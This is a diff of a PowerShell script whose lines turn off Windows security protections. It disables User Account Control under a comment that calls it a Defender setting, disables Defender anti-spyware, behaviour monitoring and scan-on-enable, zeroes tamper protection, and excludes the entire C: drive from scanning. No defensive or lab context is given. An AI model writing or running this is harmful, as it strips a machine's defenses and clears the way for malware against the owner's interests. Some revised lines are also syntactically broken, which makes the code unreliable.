@@ -1,28 +1,18 @@
 # Set Windows Defender settings
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system" -Name EnableLUA -Value 0
--Type DWord -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system" -Name EnableLUA -Value 0 -Force
 
 # Disable AntiSpyware in Windows Defender
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type
-DWord -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force
 
 # Configure Real-Time Protection settings in Windows Defender
-New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "Real-Time
-Protection" -Value 1 -Type DWord -Force
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name
-"DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name
-"DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWord -Force
 
 # Configure TamperProtection in Windows Defender Features
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Features" -Name "TamperProtection"
--Value 0 -Type DWord -Force
-
-# Corrected key for TamperProtection (removed extra Microsoft and fixed typo)
-New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "TamperProtection" -Value 0
--Type DWord -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "TamperProtection" -Value 0 -PropertyType DWord -Force
 
 # Excluding certain paths from Windows Defender scans
-ShellCmd powershell {
+powershell {
     Add-MpPreference -ExclusionPath "C:\"
 }
